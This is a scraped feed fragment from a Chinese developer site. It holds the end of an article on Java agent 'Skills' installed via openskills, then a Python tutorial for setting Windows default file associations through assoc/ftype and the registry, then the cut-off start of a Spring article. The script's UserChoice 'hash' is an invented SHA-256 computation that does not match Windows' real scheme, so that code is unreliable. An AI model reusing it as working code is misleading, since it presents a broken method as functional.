└── references/
    ├── <span class="hljs-built_in">response</span>-formats.md
    └── page-result.md
</code></pre>
<h5 data-id="heading-71">6. <strong>java-logging</strong> - 日志记录规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>配置日志格式和级别</li>
<li>实现日志脱敏</li>
<li>遵循日志记录最佳实践</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>为 Service 添加日志记录</li>
<li>配置日志格式</li>
<li>实现日志脱敏</li>
<li>优化现有日志记录</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-lua" lang="lua">java-logging/
├── SKILL.md (<span class="hljs-number">120</span> 行)
├── assets/
│   ├── logback-example.xml
│   └── desensitization-utils.java
└── references/
    ├── <span class="hljs-built_in">log</span>-levels.md
    └── <span class="hljs-built_in">log</span>-<span class="hljs-built_in">format</span>.md
</code></pre>
<h5 data-id="heading-72">7. <strong>java-mybatis-plus-generator</strong> - MyBatis-Plus 代码生成</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>生成基于 MyBatis-Plus 的完整分层代码</li>
<li>创建 Controller、Service、Mapper 层</li>
<li>集成 PageHelper 分页功能</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>创建基于 MyBatis-Plus 的 CRUD 操作</li>
<li>生成分页查询功能</li>
<li>实现 Service 层和 DAO 层代码</li>
<li>生成 Mapper XML 文件</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">java-mybatis-plus-generator/
├── SKILL.md (102 行)
├── assets/
│   ├── EntityTemplate.java
│   ├── MapperInterfaceTemplate.java
│   ├── MapperXmlTemplate.xml
│   ├── ServiceInterfaceTemplate.java
│   ├── ServiceImplTemplate.java
│   └── ControllerTemplate.java
└── references/
<span class="hljs-code">    ├── pagehelper-usage.md
    ├── query-wrapper.md
    └── generation-examples.md
</span></code></pre>
<h4 data-id="heading-73">6.3 安装和使用</h4>
<h5 data-id="heading-74">从 GitHub 安装</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装本项目所有 Skills</span>
openskills install lambert0529/skills --universal

<span class="hljs-comment"># 或者指定 java 目录</span>
openskills install lambert0529/skills/java --universal
</code></pre>
<h5 data-id="heading-75">从本地安装</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 从本地 java 目录安装</span>
openskills install ./java --universal
</code></pre>
<h5 data-id="heading-76">同步到 AGENTS.md</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 同步到 Cursor</span>
openskills <span class="hljs-built_in">sync</span> --<span class="hljs-built_in">yes</span> -o .cursor/rules/AGENTS.md
</code></pre>
<h5 data-id="heading-77">使用示例</h5>
<p><strong>在 Cursor 中</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"为用户管理创建 REST API 接口"</span>
<span class="hljs-string">"创建用户 Service 层，包含事务管理"</span>
<span class="hljs-string">"设计异常处理机制"</span>
<span class="hljs-string">"为创建用户请求添加参数校验"</span>
<span class="hljs-string">"设计统一响应格式"</span>
<span class="hljs-string">"为 Service 添加日志记录"</span>
<span class="hljs-string">"为用户管理生成基于 MyBatis-Plus 的 CRUD 代码"</span>
</code></pre>
<h4 data-id="heading-78">6.4 规范覆盖范围</h4>
<p>这些 Skills 覆盖了 Java 后端开发的核心规范：</p>
<ul>
<li>✅ RESTful API 设计</li>
<li>✅ 分层架构（Controller-Service-Repository）</li>
<li>✅ 异常处理机制</li>
<li>✅ 参数校验</li>
<li>✅ 统一响应格式</li>
<li>✅ 日志记录</li>
<li>✅ 事务管理</li>
<li>✅ MyBatis-Plus 集成</li>
<li>✅ 代码规范</li>
</ul>
<h4 data-id="heading-79">6.5 项目特点</h4>
<ul>
<li>✅ <strong>符合规范</strong>：完全遵循 Anthropic Skills 开放标准</li>
<li>✅ <strong>渐进式披露</strong>：SKILL.md 简洁（80-127 行），详细内容在 references 中</li>
<li>✅ <strong>跨平台兼容</strong>：可在 Cursor、Claude Code、Windsurf、Aider 等平台使用</li>
<li>✅ <strong>最佳实践</strong>：基于 Spring Boot 和主流后端开发规范</li>
<li>✅ <strong>开箱即用</strong>：提供完整的代码模板和参考资料</li>
</ul>
<h4 data-id="heading-80">6.6 贡献和反馈</h4>
<p>欢迎贡献和反馈！</p>
<ul>
<li><strong>GitHub Issues</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flambert0529%2Fskills%2Fissues" target="_blank" title="https://github.com/lambert0529/skills/issues" ref="nofollow noopener noreferrer">github.com/lambert0529…</a></li>
<li><strong>Pull Requests</strong>：欢迎提交 PR 改进 Skills</li>
<li><strong>Star</strong>：如果觉得有用，请给项目一个 Star ⭐</li>
</ul>
<hr/>
<h3 data-id="heading-81">📋 快速参考</h3>
<h4 data-id="heading-82">常用命令</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装技能</span>
openskills install lambert0529/skills --universal

<span class="hljs-comment"># 列出技能</span>
openskills list

<span class="hljs-comment"># 同步到 AGENTS.md</span>
openskills <span class="hljs-built_in">sync</span> --<span class="hljs-built_in">yes</span> -o .cursor/rules/AGENTS.md

<span class="hljs-comment"># 读取技能</span>
openskills <span class="hljs-built_in">read</span> java-rest-api-design

<span class="hljs-comment"># 删除技能</span>
openskills remove old-skill
</code></pre>
<h4 data-id="heading-83">目录结构</h4>
<pre><code class="hljs language-bash" lang="bash">项目根目录/
├── .agent/
│   └── skills/              <span class="hljs-comment"># 通用技能（推荐）</span>
│       ├── java-rest-api-design/
│       │   └── SKILL.md
│       └── ...
├── .claude/
│   └── skills/             <span class="hljs-comment"># Claude 技能</span>
└── .cursor/
    ├── rules/
    │   └── AGENTS.md        <span class="hljs-comment"># 技能列表（同步生成）</span>
    └── skills/              <span class="hljs-comment"># 手动创建（不被 OpenSkills 识别）</span>
</code></pre>
<hr/>
<h3 data-id="heading-84">🔗 相关资源</h3>
<h4 data-id="heading-85">标准与规范</h4>
<ul>
<li><strong>Anthropic Skills 标准</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%25EF%25BC%2588%25E5%25AE%2598%25E6%2596%25B9%25E6%25A0%2587%25E5%2587%2586%25E5%25AE%259A%25E4%25B9%2589%25EF%25BC%2589" target="_blank" title="https://github.com/anthropics/skills%EF%BC%88%E5%AE%98%E6%96%B9%E6%A0%87%E5%87%86%E5%AE%9A%E4%B9%89%EF%BC%89" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></li>
<li><strong>Anthropic Skills 市场</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%25EF%25BC%2588%25E5%25AE%2598%25E6%2596%25B9%25E6%258A%2580%25E8%2583%25BD%25E5%25BA%2593%25EF%25BC%2589" target="_blank" title="https://github.com/anthropics/skills%EF%BC%88%E5%AE%98%E6%96%B9%E6%8A%80%E8%83%BD%E5%BA%93%EF%BC%89" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></li>
</ul>
<h4 data-id="heading-86">工具与实现</h4>
<ul>
<li><strong>OpenSkills GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnumman-ali%2Fopenskills%25EF%25BC%2588%25E5%25BC%2580%25E6%25BA%2590" target="_blank" title="https://github.com/numman-ali/openskills%EF%BC%88%E5%BC%80%E6%BA%90" ref="nofollow noopener noreferrer">github.com/numman-ali/…</a> CLI 工具）</li>
<li><strong>OpenSkills 文档</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnumman-ali%2Fopenskills%23readme" target="_blank" title="https://github.com/numman-ali/openskills#readme" ref="nofollow noopener noreferrer">github.com/numman-ali/…</a></li>
</ul>
<h4 data-id="heading-87">平台支持</h4>
<ul>
<li><strong>Cursor 文档</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.cursor.com%25EF%25BC%2588Skills" target="_blank" title="https://docs.cursor.com%EF%BC%88Skills" ref="nofollow noopener noreferrer">docs.cursor.com（Skills</a> 支持情况请查看最新文档）</li>
<li><strong>Claude Code</strong>：原生支持 Anthropic Skills 标准</li>
<li><strong>Windsurf</strong>：支持 Anthropic Skills 标准</li>
<li><strong>Aider</strong>：支持 Anthropic Skills 标准</li>
</ul>
<h4 data-id="heading-88">项目资源</h4>
<ul>
<li><strong>本项目 GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flambert0529%2Fskills.git" target="_blank" title="https://github.com/lambert0529/skills.git" ref="nofollow noopener noreferrer">github.com/lambert0529…</a></li>
<li><strong>本项目 Gitee</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flbl_lambert%2Fskills.git" target="_blank" title="https://gitee.com/lbl_lambert/skills.git" ref="nofollow noopener noreferrer">gitee.com/lbl_lambert…</a></li>
<li><strong>项目 README</strong>：./README.md</li>
<li><strong>Java Skills README</strong>：./java/README.md</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Python 设置 Windows 文件默认打开程序]]></title>    <link>https://juejin.cn/post/7596926832913301567</link>    <guid>https://juejin.cn/post/7596926832913301567</guid>    <pubDate>2026-01-19T17:15:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596926832913301567" data-draft-id="7596883689827713087" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 Python 设置 Windows 文件默认打开程序"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-19T17:15:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户836279132519"/> <meta itemprop="url" content="https://juejin.cn/user/344583214737996"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 Python 设置 Windows 文件默认打开程序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/344583214737996/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户836279132519
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:15:39.000Z" title="Mon Jan 19 2026 17:15:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>转载自我的个人博客<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.ksable.top%2F2026%2F01%2F19%2Fyong-python-she-zhi-windows-wen-jian-mo-ren-da-kai-cheng-xu%2F" target="_blank" title="https://blog.ksable.top/2026/01/19/yong-python-she-zhi-windows-wen-jian-mo-ren-da-kai-cheng-xu/" ref="nofollow noopener noreferrer">《Posts: 用 Python 设置 Windows 文件默认打开程序》</a><br/>
如有什么疑问可在文章下方评论</p>
</blockquote>
<h2 data-id="heading-0">前言</h2>
<p>本人为班里任命的电教委员（苦差事），因班里的教学需求，要在特定的某天切换使用某个播放器。</p>
<p>本人就想通过 Python 自动化设置默认 MP4 打开程序，然后就在请教 deepseek 等助手后，运行其生成的代码。随后就被各种奇怪的报错给卡死了。无奈之下便上 Github 看看有没有相关的代码。</p>
<p>万幸的是，我真的在 Github 上找到个用 Python 写的 文件默认大师 软件，感谢原作者。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F3089464667%2Fdefault-app" target="_blank" title="https://github.com/3089464667/default-app" ref="nofollow noopener noreferrer">github.com/3089464667/…</a></p>
<p>我便阅读这代码，并提取了其中设置默认程序的核心代码。</p>
<h2 data-id="heading-1">代码讲解</h2>
<p>这段代码是一个用于 Windows 系统设置文件默认打开程序的 Python 工具。它通过命令行和注册表两种方式修改关联，适用于 Windows 7/10/11。</p>
<h3 data-id="heading-2">核心功能</h3>
<ul>
<li><strong>设置默认程序</strong>：通过 <code>set_default_app()</code> 函数指定文件扩展名与对应的应用程序路径，可自动配置系统关联。</li>
<li><strong>兼容性处理</strong>：优先使用 <code>assoc</code> 和 <code>ftype</code> 命令行设置，同时直接修改注册表，并处理 Windows 10/11 的用户选择验证机制。</li>
<li><strong>验证功能</strong>：<code>check_default_app()</code> 可检查当前默认程序是否为指定应用。</li>
</ul>
<h3 data-id="heading-3">使用示例</h3>
<pre><code class="hljs language-python" lang="python">set_default_app(<span class="hljs-string">".txt"</span>, <span class="hljs-string">"C:\\Windows\\notepad.exe"</span>)
<span class="hljs-keyword">if</span> check_default_app(<span class="hljs-string">".txt"</span>, <span class="hljs-string">"C:\\Windows\\notepad.exe"</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"设置成功"</span>)
</code></pre>
<h3 data-id="heading-4">完整代码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> winreg
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> hashlib

<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_default_app_cmd</span>(<span class="hljs-params">file_extension, app_path</span>):
    <span class="hljs-string">"""
    使用 Windows 命令行工具设置默认打开程序，兼容 Windows 10/11
    """</span>
    <span class="hljs-keyword">try</span>:
        ext = file_extension <span class="hljs-keyword">if</span> file_extension.startswith(<span class="hljs-string">'.'</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">'.'</span> + file_extension
        prog_id = ext[<span class="hljs-number">1</span>:].upper() + <span class="hljs-string">"File"</span>
        subprocess.run(<span class="hljs-string">f'assoc <span class="hljs-subst">{ext}</span>=<span class="hljs-subst">{prog_id}</span>'</span>, shell=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)
        subprocess.run(<span class="hljs-string">f'ftype <span class="hljs-subst">{prog_id}</span>="<span class="hljs-subst">{app_path}</span>" "%1"'</span>, shell=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">""</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-built_in">str</span>(e)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_default_app</span>(<span class="hljs-params">file_extension, app_path, icon_path=<span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    设置文件扩展名的默认打开程序
    参数:
        file_extension: 文件扩展名（如 ".txt" 或 "txt"）
        app_path: 应用程序完整路径
        icon_path: 可选图标路径
    返回: 无
    """</span>
    <span class="hljs-comment"># 先用命令行设置</span>
    ok, msg = set_default_app_cmd(file_extension, app_path)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"命令行设置失败: <span class="hljs-subst">{msg}</span>"</span>)
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 确保扩展名格式正确</span>
        ext = file_extension <span class="hljs-keyword">if</span> file_extension.startswith(<span class="hljs-string">'.'</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">'.'</span> + file_extension
        
        <span class="hljs-comment"># 创建或打开扩展名对应的注册表键</span>
        <span class="hljs-keyword">with</span> winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, ext) <span class="hljs-keyword">as</span> key:
            prog_id = winreg.QueryValue(key, <span class="hljs-literal">None</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> prog_id:
                prog_id = ext[<span class="hljs-number">1</span>:].upper() + <span class="hljs-string">"File"</span>
                winreg.SetValue(key, <span class="hljs-literal">None</span>, winreg.REG_SZ, prog_id)
            
            <span class="hljs-comment"># 设置打开命令</span>
            <span class="hljs-keyword">with</span> winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, <span class="hljs-string">f"<span class="hljs-subst">{prog_id}</span>\\shell\\open\\command"</span>) <span class="hljs-keyword">as</span> cmd_key:
                winreg.SetValue(cmd_key, <span class="hljs-literal">None</span>, winreg.REG_SZ, <span class="hljs-string">f"\"<span class="hljs-subst">{app_path}</span>\" \"%1\""</span>)
        
        <span class="hljs-comment"># 处理用户选择（Windows 10/11 需要）</span>
        user_choice_path = <span class="hljs-string">f"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\<span class="hljs-subst">{ext}</span>\\"</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">with</span> winreg.OpenKey(winreg.HKEY_CURRENT_USER, user_choice_path, <span class="hljs-number">0</span>, winreg.KEY_ALL_ACCESS) <span class="hljs-keyword">as</span> key:
                winreg.DeleteKey(key, <span class="hljs-string">"UserChoice"</span>)
        <span class="hljs-keyword">except</span> WindowsError:
            <span class="hljs-keyword">pass</span>
        
        <span class="hljs-comment"># 生成用户选择哈希（Windows 10/11 验证机制）</span>
        <span class="hljs-keyword">try</span>:
            user_sid = os.getlogin()
        <span class="hljs-keyword">except</span> Exception:
            user_sid = <span class="hljs-string">"unknown"</span>
        
        timestamp = <span class="hljs-built_in">int</span>(time.time())
        hash_input = <span class="hljs-string">f"<span class="hljs-subst">{prog_id}</span><span class="hljs-subst">{user_sid}</span><span class="hljs-subst">{timestamp}</span>"</span>.encode(<span class="hljs-string">'utf-16le'</span>)
        hash_value = hashlib.sha256(hash_input).hexdigest()
        
        <span class="hljs-keyword">with</span> winreg.CreateKey(winreg.HKEY_CURRENT_USER, user_choice_path + <span class="hljs-string">"UserChoice"</span>) <span class="hljs-keyword">as</span> key:
            winreg.SetValueEx(key, <span class="hljs-string">"ProgId"</span>, <span class="hljs-number">0</span>, winreg.REG_SZ, prog_id)
            winreg.SetValueEx(key, <span class="hljs-string">"Hash"</span>, <span class="hljs-number">0</span>, winreg.REG_SZ, hash_value)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"成功设置 <span class="hljs-subst">{ext}</span> 的默认打开程序为: <span class="hljs-subst">{app_path}</span>"</span>)
        
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"设置默认程序失败: <span class="hljs-subst">{e}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_default_app</span>(<span class="hljs-params">file_extension, app_path</span>):
    <span class="hljs-string">"""
    检查当前扩展名的默认打开程序是否为指定程序
    参数:
        file_extension: 文件扩展名
        app_path: 应用程序路径
    返回: True/False
    """</span>
    ext = file_extension <span class="hljs-keyword">if</span> file_extension.startswith(<span class="hljs-string">'.'</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">'.'</span> + file_extension
    <span class="hljs-keyword">try</span>:
        output = subprocess.check_output(<span class="hljs-string">f"assoc <span class="hljs-subst">{ext}</span>"</span>, shell=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">"gbk"</span>, errors=<span class="hljs-string">"ignore"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"="</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> output:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        prog_id = output.strip().split(<span class="hljs-string">"="</span>)[-<span class="hljs-number">1</span>]
        output2 = subprocess.check_output(<span class="hljs-string">f"ftype <span class="hljs-subst">{prog_id}</span>"</span>, shell=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">"gbk"</span>, errors=<span class="hljs-string">"ignore"</span>)
        <span class="hljs-keyword">if</span> app_path.lower() <span class="hljs-keyword">in</span> output2.lower():
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">except</span> Exception:
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment"># 使用示例</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 示例1：设置.txt文件用记事本打开</span>
    set_default_app(<span class="hljs-string">".txt"</span>, <span class="hljs-string">"C:\\Windows\\notepad.exe"</span>)
    
    <span class="hljs-comment"># 示例2：设置.jpg文件用照片查看器打开</span>
    set_default_app(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"C:\\Windows\\System32\\rundll32.exe"</span>, <span class="hljs-string">"C:\\Windows\\System32\\photo_viewer.dll"</span>)
    
    <span class="hljs-comment"># 检查设置是否成功</span>
    <span class="hljs-keyword">if</span> check_default_app(<span class="hljs-string">".txt"</span>, <span class="hljs-string">"C:\\Windows\\notepad.exe"</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"设置成功！"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"设置失败！"</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度详解Spring Context]]></title>    <link>https://juejin.cn/post/7596975035438546953</link>    <guid>https://juejin.cn/post/7596975035438546953</guid>    <pubDate>2026-01-20T03:37:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438546953" data-draft-id="7596890557547069486" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度详解Spring Context"/> <meta itemprop="keywords" content="Spring,Java"/> <meta itemprop="datePublished" content="2026-01-20T03:37:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度详解Spring Context
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:37:00.000Z" title="Tue Jan 20 2026 03:37:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
